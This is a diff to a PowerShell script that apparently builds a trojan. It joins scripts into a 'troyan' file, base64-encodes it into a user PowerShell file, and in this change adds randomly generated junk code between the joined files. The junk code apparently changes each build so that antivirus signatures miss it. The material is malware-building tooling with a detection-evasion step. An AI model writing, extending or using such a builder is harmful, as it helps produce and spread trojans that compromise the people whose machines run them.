@@ -7,6 +7,12 @@ if ([string]::IsNullOrEmpty($serverName)) {
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 & (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName
 
+
+Set-Location -Path $scriptDir
+. ".\troyancompile.randomer.ps1"
+
+
+
 Write-Host "troyan"
 
 if (Test-Path -Path $server.troyanScript) {
@@ -114,8 +120,10 @@ foreach ($file in $ps1Files) {
     $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
     $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
     $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
+    $joinedContent += Generate-RandomCode
     $joinedContent += $fileContent + [System.Environment]::NewLine
 }
+$joinedContent += Generate-RandomCode
 $joinedContent | Set-Content -Path $server.troyanScript -Encoding UTF8
 
 
@@ -133,5 +141,8 @@ function Encode-FileToBase64 {
 
 $encoded = Encode-FileToBase64 -inFile $server.troyanScript
 $encoded | Set-Content -Path $server.userPowershellFile -Encoding UTF8
+
+
+
 
 Write-Host "Troyan Compile complete"
